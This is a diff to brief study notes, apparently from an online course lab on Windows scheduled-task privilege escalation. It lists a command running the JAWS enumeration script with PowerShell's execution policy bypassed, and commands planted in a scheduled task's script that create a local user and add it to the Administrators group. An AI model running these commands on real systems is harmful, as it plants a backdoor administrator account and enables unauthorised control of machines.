@@ -1,1 +1,12 @@
-need to do from udemy
+commands from #10. Schedule Task Privilege Escalation
+
+run JAWS to see scheduled tasks.
+
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename -JAWS-Enum.txt
+
+added this script for local admin rights to Scheduled Task script file:
+net user /add rabakuku Password 123
+net localgroup administrators rabakuku /add
+
+login as .\rabakuku
+(add .\ because it is local domain admin)
